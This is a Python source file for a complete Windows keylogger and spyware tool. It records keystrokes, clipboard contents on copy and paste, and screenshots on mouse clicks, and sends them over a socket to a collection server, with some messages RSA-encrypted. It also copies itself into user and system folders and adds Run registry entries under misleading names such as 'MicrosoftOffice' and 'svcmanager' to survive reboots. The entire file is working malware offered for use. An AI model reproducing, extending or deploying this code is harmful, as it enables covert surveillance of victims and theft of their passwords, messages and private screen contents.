import keyboard
import win32api
import pyperclip
from win32con import VK_CAPITAL
import win32gui
import win32process
import os
import winreg
import shutil
import socket
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding
import pyautogui
from pynput.mouse import Listener, Button
import base64

PUBLIC_KEY_PEM = """
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA4/VQ4RqZWVMBetbyDTFj
FmnQbUSwM1OMOS8EA9Vcm9QGI+Jme6+FDFEcjinOXXWgZbui7oAcvv3lRVRM0R18
cC7nCVCZ6GaNZEyAbaSlz4R/Jqaj0GoBNKl+ct0bHP/7ym6ZqXjm2NcQYrW8SjxL
pJ8Ku6OcNuGKzsvawlujnYuKxOFocBWcD6ZiPn/8+ConvGxcCt2CtyGUi0E5jk0I
KKeMT5WDPLMpVaIR3Kr7Ikp4mYPOBCShZc/2/4O9ZffvHhpxp6+1hWEeFODTfmeU
iKTkpoHZcJutyqZ7auK3/qbk4kGyTOX/hw7slEyLhotC0GFmoKNU3H8AJJOwTWbK
cwIDAQAB
-----END PUBLIC KEY-----
"""

PUBLIC_KEY = serialization.load_pem_public_key(
    PUBLIC_KEY_PEM.encode(),
)
APP_PATH = os.getcwd() + "\\" + "".join(os.path.splitext(os.path.basename(__file__)))
HIDING_DIRS = [r"C:\Users\{}\AppData\Roaming".format(os.getlogin()), r"C:\ProgramData",
               r"C:\Users\{}\Documents".format(os.getlogin())]
IRRELEVANT_KEYS = {"caps lock": "", "space": " ", "ctrl": "", "shift": "", "tab": "", "esc": "",
                   "alt": "", "enter": "", "left windows": "", "left alt": "", "right alt": "", "right shift": "", "delete": "", "left": "", "right": ""
                   , "up": "", "down": "", "insert": "", "home": "", "pageup": "", "pagedown": "", "end": ""}
F = ["f1", "f2", "f3", "f4", "f5", "f6", "f7", "f8", "f9", "f10", "f11", "f12"]

client_socket = socket.socket()
client_socket.connect(('127.0.0.1', 1234))

LCID_DICT = {'0x436': 'Afrikaans - South Africa', '0x041c': 'Albanian - Albania', '0x045e': 'Amharic - Ethiopia',
             '0x401': 'Arabic - Saudi Arabia', '0x1401': 'Arabic - Algeria', '0x3c01': 'Arabic - Bahrain',
             '0x0c01': 'Arabic - Egypt', '0x801': 'Arabic - Iraq', '0x2c01': 'Arabic - Jordan',
             '0x3401': 'Arabic - Kuwait', '0x3001': 'Arabic - Lebanon', '0x1001': 'Arabic - Libya',
             '0x1801': 'Arabic - Morocco', '0x2001': 'Arabic - Oman', '0x4001': 'Arabic - Qatar',
             '0x2801': 'Arabic - Syria', '0x1c01': 'Arabic - Tunisia', '0x3801': 'Arabic - U.A.E.',
             '0x2401': 'Arabic - Yemen', '0x042b': 'Armenian - Armenia', '0x044d': 'Assamese',
             '0x082c': 'Azeri (Cyrillic)', '0x042c': 'Azeri (Latin)', '0x042d': 'Basque', '0x423': 'Belarusian',
             '0x445': 'Bengali (India)', '0x845': 'Bengali (Bangladesh)', '0x141A': 'Bosnian (Bosnia/Herzegovina)',
             '0x402': 'Bulgarian', '0x455': 'Burmese', '0x403': 'Catalan', '0x045c': 'Cherokee - United States',
             '0x804': "Chinese - People's Republic of China", '0x1004': 'Chinese - Singapore',
             '0x404': 'Chinese - Taiwan', '0x0c04': 'Chinese - Hong Kong SAR', '0x1404': 'Chinese - Macao SAR',
             '0x041a': 'Croatian', '0x101a': 'Croatian (Bosnia/Herzegovina)', '0x405': 'Czech', '0x406': 'Danish',
             '0x465': 'Divehi', '0x413': 'Dutch - Netherlands', '0x813': 'Dutch - Belgium', '0x466': 'Edo',
             '0x409': 'English - United States', '0x809': 'English - United Kingdom', '0x0c09': 'English - Australia',
             '0x2809': 'English - Belize', '0x1009': 'English - Canada', '0x2409': 'English - Caribbean',
             '0x3c09': 'English - Hong Kong SAR', '0x4009': 'English - India', '0x3809': 'English - Indonesia',
             '0x1809': 'English - Ireland', '0x2009': 'English - Jamaica', '0x4409': 'English - Malaysia',
             '0x1409': 'English - New Zealand', '0x3409': 'English - Philippines', '0x4809': 'English - Singapore',
             '0x1c09': 'English - South Africa', '0x2c09': 'English - Trinidad', '0x3009': 'English - Zimbabwe',
             '0x425': 'Estonian', '0x438': 'Faroese', '0x429': 'Farsi', '0x464': 'Filipino', '0x040b': 'Finnish',
             '0x040c': 'French - France', '0x080c': 'French - Belgium', '0x2c0c': 'French - Cameroon',
             '0x0c0c': 'French - Canada', '0x240c': 'French - Democratic Rep. of Congo', '0x300c':
                 "French - Cote d'Ivoire", '0x3c0c': 'French - Haiti', '0x140c': 'French - Luxembourg',
             '0x340c': 'French - Mali', '0x180c': 'French - Monaco', '0x380c': 'French - Morocco',
             '0xe40c': 'French - North Africa', '0x200c': 'French - Reunion', '0x280c': 'French - Senegal',
             '0x100c': 'French - Switzerland', '0x1c0c': 'French - West Indies', '0x462': 'Frisian - Netherlands',
             '0x467': 'Fulfulde - Nigeria', '0x042f': 'FYRO Macedonian', '0x083c': 'Gaelic (Ireland)',
             '0x043c': 'Gaelic (Scotland)', '0x456': 'Galician', '0x437': 'Georgian', '0x407': 'German - Germany',
             '0x0c07': 'German - Austria', '0x1407': 'German - Liechtenstein', '0x1007': 'German - Luxembourg',
             '0x807': 'German - Switzerland', '0x408': 'Greek', '0x474': 'Guarani - Paraguay', '0x447': 'Gujarati',
             '0x468': 'Hausa - Nigeria', '0x475': 'Hawaiian - United States', '0x40d': 'Hebrew', '0x439': 'Hindi',
             '0x040e': 'Hungarian', '0x469': 'Ibibio - Nigeria', '0x040f': 'Icelandic', '0x470': 'Igbo - Nigeria',
             '0x421': 'Indonesian', '0x045d': 'Inuktitut', '0x410': 'Italian - Italy',
             '0x810': 'Italian - Switzerland', '0x411': 'Japanese', '0x044b': 'Kannada', '0x471': 'Kanuri - Nigeria',
             '0x860': 'Kashmiri', '0x460': 'Kashmiri (Arabic)', '0x043f': 'Kazakh', '0x453': 'Khmer',
             '0x457': 'Konkani', '0x412': 'Korean', '0x440': 'Kyrgyz (Cyrillic)', '0x454': 'Lao', '0x476': 'Latin',
             '0x426': 'Latvian', '0x427': 'Lithuanian', '0x043e': 'Malay - Malaysia',
             '0x083e': 'Malay - Brunei Darussalam', '0x044c': 'Malayalam', '0x043a': 'Maltese', '0x458': 'Manipuri',
             '0x481': 'Maori - New Zealand', '0x044e': 'Marathi', '0x450': 'Mongolian (Cyrillic)',
             '0x850': 'Mongolian (Mongolian)', '0x461': 'Nepali', '0x861': 'Nepali - India',
             '0x414': 'Norwegian (Bokmål)', '0x814': 'Norwegian (Nynorsk)', '0x448': 'Oriya', '0x472': 'Oromo',
             '0x479': 'Papiamentu', '0x463': 'Pashto', '0x415': 'Polish', '0x416': 'Portuguese - Brazil',
             '0x816': 'Portuguese - Portugal', '0x446': 'Punjabi', '0x846': 'Punjabi (Pakistan)',
             '0x046B': 'Quecha - Bolivia', '0x086B': 'Quecha - Ecuador', '0x0C6B': 'Quecha - Peru',
             '0x417': 'Rhaeto-Romanic', '0x418': 'Romanian', '0x818': 'Romanian - Moldava', '0x419': 'Russian',
             '0x819': 'Russian - Moldava', '0x043b': 'Sami (Lappish)', '0x044f': 'Sanskrit', '0x046c': 'Sepedi',
             '0x0c1a': 'Serbian (Cyrillic)', '0x081a': 'Serbian (Latin)', '0x459': 'Sindhi - India',
             '0x859': 'Sindhi - Pakistan', '0x045b': 'Sinhalese - Sri Lanka', '0x041b': 'Slovak',
             '0x424': 'Slovenian', '0x477': 'Somali', '0x042e': 'Sorbian', '0x0c0a': 'Spanish - Spain (Modern Sort)',
             '0x040a': 'Spanish - Spain (Traditional Sort)', '0x2c0a': 'Spanish - Argentina',
             '0x400a': 'Spanish - Bolivia', '0x340a': 'Spanish - Chile', '0x240a': 'Spanish - Colombia',
             '0x140a': 'Spanish - Costa Rica', '0x1c0a': 'Spanish - Dominican Republic',
             '0x300a': 'Spanish - Ecuador', '0x440a': 'Spanish - El Salvador', '0x100a': 'Spanish - Guatemala',
             '0x480a': 'Spanish - Honduras', '0xe40a': 'Spanish - Latin America', '0x080a': 'Spanish - Mexico',
             '0x4c0a': 'Spanish - Nicaragua', '0x180a': 'Spanish - Panama', '0x3c0a': 'Spanish - Paraguay',
             '0x280a': 'Spanish - Peru', '0x500a': 'Spanish - Puerto Rico', '0x540a': 'Spanish - United States',
             '0x380a': 'Spanish - Uruguay', '0x200a': 'Spanish - Venezuela', '0x430': 'Sutu', '0x441': 'Swahili',
             '0x041d': 'Swedish', '0x081d': 'Swedish - Finland', '0x045a': 'Syriac', '0x428': 'Tajik',
             '0x045f': 'Tamazight (Arabic)', '0x085f': 'Tamazight (Latin)', '0x449': 'Tamil', '0x444': 'Tatar',
             '0x044a': 'Telugu', '0x041e': 'Thai', '0x851': 'Tibetan - Bhutan',
             '0x451': "Tibetan - People's Republic of China", '0x873': 'Tigrigna - Eritrea',
             '0x473': 'Tigrigna - Ethiopia', '0x431': 'Tsonga', '0x432': 'Tswana', '0x041f': 'Turkish',
             '0x442': 'Turkmen', '0x480': 'Uighur - China', '0x422': 'Ukrainian', '0x420': 'Urdu',
             '0x820': 'Urdu - India', '0x843': 'Uzbek (Cyrillic)', '0x443': 'Uzbek (Latin)', '0x433': 'Venda',
             '0x042a': 'Vietnamese', '0x452': 'Welsh', '0x434': 'Xhosa', '0x478': 'Yi', '0x043d': 'Yiddish',
             '0x046a': 'Yoruba', '0x435': 'Zulu', '0x04ff': 'HID (Human Interface Device)'}


def hide():
    for dir in HIDING_DIRS:
        shutil.copy2(APP_PATH, dir)


def screenshot(event):
    screenshot_path = HIDING_DIRS[1] + "\\" + "d.png"
    if os.path.isfile(screenshot_path):
        os.remove(screenshot_path)
    myScreenshot = pyautogui.screenshot()
    myScreenshot.save(screenshot_path)
    with open(screenshot_path, 'rb') as f:
        data = f.read()
        send_message(event + data)

    os.remove(screenshot_path)


def run_on_startup():
    if APP_PATH.endswith(".py"):
        new_value = "python.exe " + APP_PATH
    else:
        new_value = APP_PATH
    key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    value_name = "MicrosoftOffice"
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)

    winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, new_value)

    for dir in HIDING_DIRS:
        app_names = ["SystemReg", "sysinternals", "svcmanager"]
        path = dir + "\\" + "".join(os.path.splitext(os.path.basename(__file__)))
        if path.endswith(".py"):
            new_value = "python.exe " + path
        else:
            new_value = path
        key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        value_name = app_names.pop(0)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)

        winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, new_value)


def get_lang_id():
    foreground_window = win32gui.GetForegroundWindow()
    thread_id, _ = win32process.GetWindowThreadProcessId(foreground_window)
    layout_id = win32api.GetKeyboardLayout(thread_id)
    lang_id = layout_id & 0xFFFF
    return str(hex(lang_id))


def send_message(msg):
    if b"~MSG~" not in msg:
        client_socket.sendall(msg)
    else:
        ciphertext = PUBLIC_KEY.encrypt(
            msg,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None,
            ),
        )
        ciphertext = base64.b64encode(b"~MSG~" + ciphertext)
        client_socket.sendall(ciphertext)


def on_key_press(event):

    global language
    if language != LCID_DICT[get_lang_id()]:
        send_message(b"~MSG~~~Language changed to " + LCID_DICT[get_lang_id()].encode() + b"~~")
        language = LCID_DICT[get_lang_id()]

    key = event.name
    if event.name == 'c' and keyboard.is_pressed('ctrl'):
        send_message(b"~MSG~~~~~~~\nCopied:\n" + pyperclip.paste().encode() + b"\n~~~~~~\n")
        screenshot(b"~CP IMG~")
        return
    elif event.name == 'v' and keyboard.is_pressed('ctrl'):
        send_message(b"~MSG~~~~~~~\nPasted:\n" + pyperclip.paste().encode() + b"\n~~~~~~\n")
        screenshot(b"~PT IMG~")
        return
    if key in IRRELEVANT_KEYS:
        key = IRRELEVANT_KEYS[key]
    if key in F:
        key = "\n~~\n" + key + "\n~~\n"
    if event.event_type == keyboard.KEY_DOWN:
        if win32api.GetKeyState(VK_CAPITAL):
            send_message(b"~MSG~" + key.upper().encode())
        else:
            send_message(b"~MSG~" + key.encode())


def on_key_release():
    return


def on_click(x, y, button, pressed):
    if not pressed:
        if button == Button.left:
            screenshot(b"~M1 IMG~")
        elif button == Button.right:
            screenshot(b"~M2 IMG~")


def main():
    hide()
    run_on_startup()
    global language
    language = LCID_DICT[get_lang_id()]

    while True:
        keyboard.on_press(on_key_press)
        keyboard.on_release(on_key_release)

        with Listener(on_click=on_click) as listener:
            listener.join()


if __name__ == "__main__":
    main()
